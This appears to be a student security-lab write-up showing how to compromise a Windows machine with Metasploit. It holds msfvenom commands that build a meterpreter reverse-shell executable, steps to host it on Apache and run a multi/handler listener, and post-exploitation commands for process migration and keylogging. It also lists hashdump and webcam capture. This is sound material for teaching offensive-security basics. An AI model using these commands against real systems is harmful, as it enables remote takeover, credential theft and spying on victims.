# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

### Developed By

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:


## Architecture Diagram

```bash
## 🛠️ Metasploit Exploitation Architecture (Windows Target)


+----------------+                           +------------------+
|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
|  - handler     |                           |                  |
+-------+--------+                           +--------+---------+
        |                                             |
        |  ⚙️ Payload generation using msfvenom        |
        |                                             |
        v                                             v
msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
         LHOST=attacker_ip LPORT=4444               or exploit triggers  
         -f exe > evil.exe  

        |
        |  🧲 Listener waits (multi/handler)
        v

+------------------------------------------------------------+
|     🧠 Meterpreter Session Established (shell access)       |
+------------------------------------------------------------+
| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
+------------------------------------------------------------+

```
### PROGRAM:

Find the attackers ip address using ifconfig

### Output:
<img width="676" height="383" alt="image" src="https://github.com/user-attachments/assets/dd5250d5-09c1-4fd7-82b2-a0048bedf610" />



Create a malicious executable file fun.exe using msenom command ``` msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.2.15 -f exe -o divya.exe```

### Output:

<img width="826" height="200" alt="image" src="https://github.com/user-attachments/assets/de2d4314-497c-447a-ba74-5822866cfc2b" />


copy the divya.exe into the apache ```/var/www/html ```folder
<img width="385" height="64" alt="image" src="https://github.com/user-attachments/assets/b80f2833-22ea-4513-bf80-4521a9412dd4" />




Start apache server ```sudo systemctl apache2 start``` 

<img width="351" height="55" alt="image" src="https://github.com/user-attachments/assets/350d970a-9b77-46d2-8b55-f6e516cda121" />



Check the status of apache2 ```sudo apache2 status```
<img width="991" height="437" alt="image" src="https://github.com/user-attachments/assets/093395e3-a8bb-4103-b8b8-276f5f6fcc4d" />


Invoke msfconsole:
<img width="871" height="617" alt="image" src="https://github.com/user-attachments/assets/1e1b992c-893a-41d2-bdcf-98902b7eddef" />

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
<img width="746" height="612" alt="image" src="https://github.com/user-attachments/assets/d2156186-6916-4cbd-bd41-c7ee430f3dc9" />

Starting a command and control Server ```use multi/handler``` ```set PAYLOAD windows/meterpreter/reverse_tcp``` ```set LHOST 0.0.0.0``` ```exploit```
<img width="955" height="707" alt="image" src="https://github.com/user-attachments/assets/02efea2a-2bb8-42e5-980c-2b52b34fdbf1" />


### Output 


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: ```http://10.0.2.15/divya.exe``` The file "divya.exe" downloads.

### Output 

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/dfd3a18b-272b-4dfe-830e-a0e510f16fc2" />




Bypass any warning boxes, double-click the file, and allow it to run.
On kali give the command exploit

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/53690e31-8c7f-45cf-80d7-7917e1695a1b" />


To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

#### Post Exploitation:
The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.


<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/a119c461-b7dd-4b65-8ced-480a5c23cf57" />

keyscan_dump Shows the keystrokes captured so far

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0a80c2a6-1df9-4291-8677-407d80e493f6" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

